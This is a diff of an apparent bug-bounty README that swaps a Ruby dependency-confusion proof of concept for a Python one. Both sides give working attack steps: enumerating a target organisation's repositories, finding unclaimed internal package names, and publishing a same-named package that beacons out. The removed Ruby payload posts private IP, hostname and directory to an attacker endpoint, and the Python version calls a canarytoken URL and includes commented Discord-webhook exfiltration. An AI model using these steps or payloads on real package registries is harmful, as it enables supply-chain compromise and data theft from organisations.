@@ -1,125 +1,147 @@
 <h1 align="center">
-    <a href="https://www.youtube.com/@techghoshal"><img src="https://github.com/techghoshal/ruby_dependency_confusion_attacks/assets/85815644/0b65137c-72e8-4003-b4b1-265cd25a37bd"></a>
-<h1 align="center">Ruby Dependency Confusion Attacks POC
+    <a href="https://www.youtube.com/@techghoshal"><img src="https://github.com/techghoshal/Fix-Grub-Boot-Menu/assets/85815644/26ed3a3f-a1e6-452c-b2ac-cac5c3d7478e"></a>
+<h1 align="center">Python Dependency Confusion Attacks POC
 <p align="center"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/techghoshal?style=social"></p>
 </h1>
 
-# Overview
 
-This proof-of-concept (PoC) demonstrates how Ruby applications can be vulnerable to dependency confusion attacks, potentially leading to remote code execution (RCE). The attack exploits the way package managers resolve dependencies, allowing malicious actors to inject unauthorized code into systems that rely on both public and private package repositories.
+## How to Finds & How to Exploit
 
-# Understanding Dependency Confusion
+Finds requirement.txt then check the all dependency here is public or not
 
-Dependency confusion arises when a package manager, such as Bundler for Ruby, inadvertently fetches a malicious package from a public repository instead of the intended internal one. This typically occurs when:
+`https://pypi.org/project/pip/`
 
-- An internal package is referenced in a project's `Gemfile`.
-- The internal package is not available in the public repository (e.g., RubyGems).
-- An attacker publishes a malicious package with the same name and a higher version number to the public repository.
-
-When the application resolves dependencies, it may prioritize the higher version number from the public repository, leading to the execution of the attacker's code.
-
-# Proof of Concept (PoC)
-
-The following steps outline how an attacker can exploit this vulnerability:
-
-1. **Identify Target Repositories**:
-- Use tools like [ghorg](https://github.com/gabrie30/ghorg) to clone all repositories from a target organization:
+#### Download all target github repository
+- Crate personal access tokens (classic):- https://github.com/settings/tokens
+- Install ghorg - https://github.com/gabrie30/ghorg#installation
 ```bash
-ghorg clone <target_organization> -t <personal_access_token>
+$ ghorg clone <target> -t <token>
 ```
-- Example:
+`example: $ ghorg clone google -t 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`
+    
+- After Download all repository finds vulnerable python package
+    
+```bash 
+$ find . -type f -name requirements.txt | xargs -n1 -I{} cat {} |  awk '{print $1;}' | tr -d '><~#$' | sort -u |  cut -d '=' -f 1 | awk '{print $1;}' | sed -r 's/[^[:space:]]*[0-9][^[:space:]]* ?//g' | sort -u | xargs -n1 -I{} echo "https://pypi.org/project/{}/" | httpx -status-code -silent -content-length -mc 404
+```
+- 404 code means this package not available publicly So This the vulnerable to dependencies confusion.
+
+- So now Publish this python packages publicly (https://pypi.org)
+
 ```bash
-ghorg clone microsoft -t ghp_exampleToken123
+$ mkdir <package-name>
 ```
-2. **Extract Gem Dependencies**:
-- Search for `Gemfile` files and extract gem names:
 ```bash
-find . -type f -name Gemfile | \
-xargs -n1 -I{} awk '/^\s*gem / {gsub(/[",'\''()]/, "", $2); print $2}' {} | \
-sort -u
+$ cd <package-name>
 ```
-3. **Check for Public Availability**:
-- Verify if the extracted gems are available on RubyGems:
 ```bash
-xargs -n1 -I{} httpx -silent -status-code -mc 404 "https://rubygems.org/gems/{}"
+$ mkdir <package-name> 
 ```
-- A `404` status code indicates the gem is not publicly available, making it a candidate for dependency confusion.
-4. **Publish Malicious Gem**:
-- Create a new gem with the same name and a higher version number:
 ```bash
-bundle gem <package_name>
-cd <package_name>
+$ cd <package-name>
 ```
-- Modify the `<package_name>.gem` file:
 ```bash
-    Gem::Specification.new do |s|
-    s.name        = "<package_name>"
-    s.version     = "9.9.9"
-    s.summary     = "Vulnerability Disclosure: Dependency confiuse vulnerability"
-    s.description = "This Ruby package vulnerable to dependency confiuse vulnerability"
-    s.authors     = ["<YOUR NAME>"]
-    s.email       = "<YOUR EMAIL>"
-    s.files       = ["lib/<package_name>.rb"]
-    s.homepage    =
-        "https://rubygems.org/gems/<package_name>"
-    s.license       = "MIT"
-end
+$ touch __init__.py 
 ```
-- Modify the `.gemspec` file to include malicious code. For example, in `lib/<package_name>.rb`:
+
 ```bash
-require 'json'
-require 'net/http'
-require 'socket'
+# python package dependency confiuse vulnerability POC 
+# name: techghoshal
+# e-mail: techghoshal@gmail.com
+# Impact this vulnerability: Remote code execution(RCE)
 
-priv_ip = UDPSocket.open { |s| s.connect("64.233.187.99", 1); s.addr.last }
-hostname = Socket.gethostname
-dir = Dir.pwd
 
-uri = URI('https://<attacker_endpoint>')
-req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
-req.body = { private_ip: priv_ip, hostname: hostname, current_directory: dir }.to_json
+import request
+#from discord import SyncWebhook
+#import os
 
-Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
-  http.request(req)
-end
+## canarytokens_url OR burp collaborator URL
+requests.get("canarytokens_url")
+
+## Send target system info to your discord server 
+#webhook = SyncWebhook.from_url("<discord_webhook_url>")
+
+#osname =  os.uname()
+#cwd = os.getcwd()
+
+#webhook.send(f"OS-Info: {osname}")
+#webhook.send(f"Current-DIR: {cwd}")
 ```
-- Save this file and back `cd..` from the directory
-- Build and push the gem to RubyGems:
+
+- Save this file
+
 ```bash
-gem build <package_name>.gemspec
-gem push <package_name>-9.9.9.gem
+$ cd .. 
 ```
-# Mitigation Strategies
+```bash
+$ touch setup.py
+```
+- Note: The version of package and the version of the vulnerable package must be same
+    
+```bash 
+from setuptools import setup, find_packages
+import codecs
+import os
 
-To protect against dependency confusion attacks:
+here = os.path.abspath(os.path.dirname(__file__))
 
-- **Specify Sources Explicitly**:
+with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
+    long_description = "\n" + fh.read()
 
-    - In your `Gemfile`, define the source for each gem:
-    ```bash
-    source 'https://rubygems.org' do
-    gem 'public_gem'
-    end
+VERSION = '0.0.1'
+DESCRIPTION = 'Dependency confiuse Attack'
+LONG_DESCRIPTION = 'Python package dependency confiuse vulnerability POC. Impact this vulnerability is Remote code execution (RCE)'
 
-    source 'https://internal.repo' do
-    gem 'internal_gem'
-    end`
-    ```
-- **Use Private Gem Servers**:
-    - Host internal gems on a private server and ensure they are not accessible publicly.
+# Setting up
+setup(
+    name="<package-name>",
+    version=VERSION,
+    author="<techghoshal>",
+    author_email="<techghoshal@gmail.com>",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=long_description,
+    packages=find_packages(),
+    install_requires=['requests', 'discord'],
+    keywords=[]
+   )
+```
+- Save this file
 
-- **Claim Internal Package Names**:
+```bash
+$ touch README.md
+```
+```bash
+<h1 align="center">This Python package vulnerable to dependency confusion vulnerability</h1>
+```
+- Save this file
 
-    - Even if not publishing them, register internal package names on public repositories to prevent malicious actors from claiming them.
+- Next build package
+```bash
+$ python3 setup.py sdist bdist_wheel
+```
 
-- **Update Bundler**:
+- Upload file publicly (https://pypi.org)
 
-    - Ensure you're using Bundler version 2.2.18 or later, which includes fixes for dependency confusion vulnerabilities.
+- Create Accont on pypi.org
 
-# Conclusion
+```bash
+$ pip3 install twine
+```
+```bash
+$ twine upload dist/*
+```
 
-Dependency confusion poses a significant risk to applications that rely on both public and private package repositories. By understanding the attack vector and implementing proper safeguards, developers can mitigate the risk and protect their systems from potential exploitation.
+- Enter your username: <username>
+- Enter your password: <password>
 
-### Connect me
+---
+    
+Upload IS DONE 😎 
+<br>
+🎉 Now Bounty Time 💰💰
+    
+## Connect me
+If you have any queries, you can always contact me on <a href="https://twitter.com/techghoshal">twitter(@techghoshal)</a>
 
-If you have any queries, you can always contact me on [Linkedin](https://www.linkedin.com/in/anindyaghoshal/)
+
